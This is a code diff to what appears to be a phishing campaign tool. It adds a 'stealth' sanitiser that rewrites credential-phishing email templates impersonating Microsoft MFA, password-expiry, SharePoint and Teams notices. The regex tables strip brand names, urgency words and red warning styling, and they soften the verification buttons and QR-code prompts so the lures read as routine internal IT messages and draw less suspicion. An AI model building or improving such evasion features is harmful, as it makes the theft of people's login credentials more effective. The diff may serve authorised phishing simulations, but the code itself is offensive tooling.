@@ -2243,6 +2243,11 @@ function applyTemplate(idx) {
     var phishUrl = document.getElementById("compose-oauth-url").value || "#";
     body = body.split("{{URL}}").join(phishUrl);
   }
+  if (stealthMode) {
+    var sanitized = stealthSanitize(document.getElementById("compose-subject").value, body);
+    document.getElementById("compose-subject").value = sanitized.subject;
+    body = sanitized.body;
+  }
   document.getElementById("compose-body").value = body;
   document.querySelectorAll(".tmpl-chip").forEach(function(c,i){
     if(i===idx) c.classList.add("active"); else c.classList.remove("active");
@@ -2401,6 +2406,7 @@ function toggleStealth() {
     btn.classList.remove("active");
     panel.classList.remove("active");
   }
+  if (lastTemplateIdx >= 0) applyTemplate(lastTemplateIdx);
 }
 
 function applyStealthDefaults() {
@@ -2452,6 +2458,78 @@ function stealthWrapUrl(body) {
     i = aEnd;
   }
   return result;
+}
+
+function stealthSanitize(subject, body) {
+  // ── Subject rewrites ────────────────────────────────
+  var subjectMap = [
+    [/Action Required:\s*/gi, ""],
+    [/Warning:\s*/gi, ""],
+    [/Urgent:\s*/gi, ""],
+    [/\bAction Needed:\s*/gi, ""],
+    [/Multi-Factor Authentication Verification/gi, "Quarterly Access Review"],
+    [/Verify Your Account/gi, "Collaboration Access Update"],
+    [/Complete Your Device Registration/gi, "Endpoint Compliance Check"],
+    [/Verify Identity for Shared Documents/gi, "Document Access — Action Needed"],
+    [/Your Password Will Expire Soon/gi, "Scheduled Credential Rotation Reminder"],
+    [/Microsoft Teams:\s*/gi, ""],
+    [/Microsoft Security/gi, "Information Security"],
+  ];
+  var s = subject;
+  for (var i = 0; i < subjectMap.length; i++) {
+    s = s.replace(subjectMap[i][0], subjectMap[i][1]);
+  }
+
+  // ── Body rewrites ──────────────────────────────────
+  var b = body;
+  var bodyMap = [
+    // Remove Microsoft branding from headers
+    [/Microsoft Security/g, "Information Security"],
+    [/Microsoft Corporation \| Automated security notification/g, "Automated security notification"],
+    [/Microsoft Teams \| Automated notification/g, "Internal Communications"],
+    [/Microsoft SharePoint \| Automated notification/g, "Document Services"],
+    [/IT Security \| Automated password notification/g, "Automated credential notification"],
+    [/— IT Security Team/g, "— IT Services"],
+    [/>SharePoint Online</g, ">Document Portal<"],
+    [/>Microsoft Teams</g, ">Collaboration Services<"],
+
+    // Soften urgency language
+    [/Action Required/gi, "For your review"],
+    [/immediately/gi, "at your convenience"],
+    [/Your organization password is set to expire within the next 24 hours\./gi, "As part of our regular credential rotation schedule, your access credentials are due for renewal."],
+    [/To prevent account lockout, please re-authenticate your device now\./gi, "Please complete the renewal process below when you have a moment."],
+    [/Password Expiration Notice/gi, "Credential Renewal"],
+    [/This link will expire shortly\. Please complete verification as soon as possible\./gi, "Please complete this process within the next few business days."],
+    [/requires verification/gi, "has a pending update"],
+    [/we require all employees to verify/gi, "we are asking employees to confirm"],
+    [/This is a routine check/gi, "This is part of our quarterly review"],
+
+    // Remove alarm styling (red/orange warning banners)
+    [/background:#d83b01/g, "background:#2b579a"],
+    [/color:#d83b01/g, "color:#2b579a"],
+    [/border-left:4px solid #d83b01/g, "border-left:4px solid #2b579a"],
+    [/background:#fff4ce/g, "background:#f0f4fa"],
+    [/&#9888; /g, ""],
+
+    // Remove "Scan to verify/re-authenticate" phrasing
+    [/Scan to re-authenticate:/gi, "Complete renewal:"],
+    [/Scan to verify your identity:/gi, "Confirm your access:"],
+    [/Scan to verify your account:/gi, "Confirm your access:"],
+    [/Scan to register your device:/gi, "Register below:"],
+
+    // Soften button text
+    [/>Verify My Account</g, ">Continue<"],
+    [/>Re-authenticate Now</g, ">Renew Access<"],
+    [/>Verify Account</g, ">Continue<"],
+
+    // Footer — remove MS branding
+    [/Microsoft Corporation/g, "Internal Services"],
+  ];
+  for (var j = 0; j < bodyMap.length; j++) {
+    b = b.replace(bodyMap[j][0], bodyMap[j][1]);
+  }
+
+  return {subject: s, body: b};
 }
 
 // Stealth pre-send hook — called from the send button
